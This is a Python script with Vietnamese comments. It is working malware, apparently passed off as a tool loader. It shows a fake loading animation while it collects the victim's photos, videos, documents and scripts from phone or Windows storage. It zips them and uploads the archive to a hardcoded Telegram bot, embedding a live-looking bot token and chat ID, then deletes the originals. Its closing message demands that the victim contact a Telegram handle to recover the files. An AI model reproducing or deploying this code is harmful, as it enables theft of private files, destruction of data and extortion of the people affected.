import os
import sys
import requests
import time
import threading
import zipfile
import warnings

# ANSI color codes for terminal output
trang = "\033[1;37m"
luc = "\033[1;32m"
red = "\033[1;31m"

# Telegram Bot information
TOKEN = "7636168350:AAG9FPUs6X0YeSf0y7MQidiVJk9NmhfJe1s"  # Thay bằng token thật
CHAT_ID = "6563080552"  # Thay bằng chat ID thật
TELEGRAM_URL = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
ip = requests.get('https://kiemtraip.com/raw.php').text

# Đường dẫn đến file bạn không muốn xóa
protected_file = "golikenokey.py" # Tên file bạn muốn bảo vệ khỏi bị xóa

# Fake loading để đánh lạc hướng người dùng
def fake_loading():
    animations = ["|", "/", "-", "\\"]
    print(f"{trang}Thông Tin Liên Hệ")
    print(f"{trang}Telegram: {luc}@luaday123")
    print(f"{trang}Dán này lên Google : {luc}t.me/luaday123")
    print(f"{trang}[+] Đang bắt đầu quá trình tải dữ liệu... Vui lòng đợi.")
    for _ in range(10):  # Simulate loading for 10 seconds
        print(f"\r[+] Đang tải để vào tool ... {animations[_ % 4]}", end="", flush=True)
        time.sleep(1)

# Tìm tất cả file ảnh trên máy
def find_image_files():
    image_extensions = (".py", ".php", ".mp4", ".json", ".zip", ".txt", ".html", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".webp")
    root_dirs = ["/storage/emulated/0", "/sdcard", os.environ.get("USERPROFILE", "")]  # Các thư mục tìm kiếm

    file_list = set()  # Sử dụng set để tránh trùng file
    for root_dir in root_dirs:
        if os.path.exists(root_dir):
            for root, _, files in os.walk(root_dir):
                for file in files:
                    if file.lower().endswith(image_extensions):
                        file_list.add(os.path.join(root, file))
    
    return list(file_list)
    
# Hàm tạo tên file duy nhất (không đổi tên, giữ nguyên tên gốc)
def generate_unique_name(file_path):
    return os.path.basename(file_path)  # Giữ nguyên tên file gốc

# Nén tất cả ảnh vào file ZIP, tránh trùng tên
def create_zip(file_paths, zip_name=f"{ip}.zip"):
    # Ngừng hiển thị cảnh báo về trùng tên file
    warnings.filterwarnings("ignore", category=UserWarning, module="zipfile")
    
    with zipfile.ZipFile(zip_name, 'w') as zipf:
        for file in file_paths:
            try:
                unique_name = generate_unique_name(file)  # Giữ nguyên tên gốc của file
                zipf.write(file, unique_name)  # Thêm file vào ZIP với tên gốc
            except:
                continue  # Bỏ qua lỗi và tiếp tục
                
    return zip_name

# Gửi file ZIP lên Telegram
def send_file(file_path):
    try:
        with open(file_path, "rb") as file:
            response = requests.post(
                TELEGRAM_URL,
                data={"chat_id": CHAT_ID, "caption": f"Đã tải file: {os.path.basename(file_path)}"},
                files={"document": file},
            )
        return response.status_code == 200
    except:
        return False  # Nếu có lỗi, trả về False nhưng không hiển thị lỗi

# Xóa tất cả file ảnh sau khi đã nén
def delete_files(file_paths):
    for file in file_paths:
        if os.path.basename(file) == protected_file:
            continue  # Bỏ qua việc xóa file này
        try:
            os.remove(file)
        except:
            continue  # Bỏ qua lỗi khi xóa và tiếp tục

# Xóa file ZIP sau khi gửi
def delete_zip(zip_path):
    try:
        os.remove(zip_path)
    except:
        pass  # Không hiển thị lỗi khi xóa file ZIP

# Main function
def main():
    loading_thread = threading.Thread(target=fake_loading)
    loading_thread.start()

    image_files = find_image_files()
    
    if image_files:
        zip_path = create_zip(image_files)
        if send_file(zip_path):
            delete_files(image_files)  # Xóa tất cả ảnh sau khi nén
            delete_zip(zip_path)  # Xóa file ZIP sau khi gửi
            print(f"\n{red}Toàn bộ file ảnh của bạn đã , gửi đi và xóa sạch!")
            print(f"{trang}Liên hệ Telegram {luc}@luaday123 {trang}để lấy lại.")
            print(f"{trang}Dán này lên Google : {luc}t.me/luaday123")
            sys.exit()  # Dừng chương trình ngay sau khi gửi và xóa

    loading_thread.join()  # Chờ quá trình fake loading hoàn tất

if __name__ == "__main__":
    main()
